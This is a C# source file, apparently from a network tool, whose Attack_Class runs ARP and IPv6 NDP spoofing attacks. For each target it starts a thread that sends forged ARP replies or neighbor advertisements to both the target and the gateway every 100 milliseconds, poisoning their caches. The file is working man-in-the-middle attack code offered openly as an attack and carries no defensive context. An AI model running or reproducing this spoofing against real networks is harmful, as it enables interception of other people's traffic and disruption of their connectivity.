using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net.Sockets;

class Attack_Class
{
    //--Classes
    private Arp_Class arp;
    private Ndp_Class ndp;

    //--Variables
    private LibPcapLiveDevice liveDevice;
    private readonly List<Thread> threadList = new List<Thread>();

    /// <summary>
    /// Indicates whether a Attack is active = true
    /// </summary>
    private bool scanStatus = false;

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pLiveDevice"></param>
    /// <param name="pTargetList"></param>
    public void StartAttack(LibPcapLiveDevice pLiveDevice, TargetList_Class pTargetList)
    {
        if (pLiveDevice != null)
        {
            // LiveDevice
            liveDevice = pLiveDevice;

            // ARP & NDP
            arp = new Arp_Class();
            ndp = new Ndp_Class(pLiveDevice);

            // Scan-Status
            scanStatus = true;

            foreach (Target_Class target in pTargetList.GetTargetList())
            {
                if (target.t_ipAddr.AddressFamily.Equals(AddressFamily.InterNetwork))
                {
                    Thread thread = new(() => ArpThreadMethod(target));
                    thread.Start();

                    threadList.Add(thread);
                }
                else if (target.t_ipAddr.AddressFamily.Equals(AddressFamily.InterNetworkV6))
                {
                    Thread thread = new(() => NdpThreadMethod(target));
                    thread.Start();

                    threadList.Add(thread);
                }
            }
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTarget"></param>
    private void ArpThreadMethod(Target_Class pTarget)
    {
        //--Build Networkpacket
        Packet arpRplPck_Target = Arp_Class.BuildArpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr, liveDevice);
        Packet arpRplPck_Gateway = Arp_Class.BuildArpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr, liveDevice);

        while (scanStatus)
        {
            liveDevice.SendPacket(arpRplPck_Target);
            liveDevice.SendPacket(arpRplPck_Gateway);
            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTarget"></param>
    private void NdpThreadMethod(Target_Class pTarget)
    {
        //--Build Networkpacket
        Packet ndpAdvPck_Target = ndp.BuildNdpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr);
        Packet ndpAdvPack_Gateway = ndp.BuildNdpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr);

        while (scanStatus)
        {
            liveDevice.SendPacket(ndpAdvPck_Target);
            liveDevice.SendPacket(ndpAdvPack_Gateway);
            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    public void ForceStop()
    {
        scanStatus = false;

        foreach (Thread item in threadList)
        {
            item.Abort();
        }
        threadList.Clear();
    }

    /// <summary>
    /// 
    /// </summary>
    /// <returns></returns>
    public int GetThreadCount()
    {
        return threadList.Count;
    }
}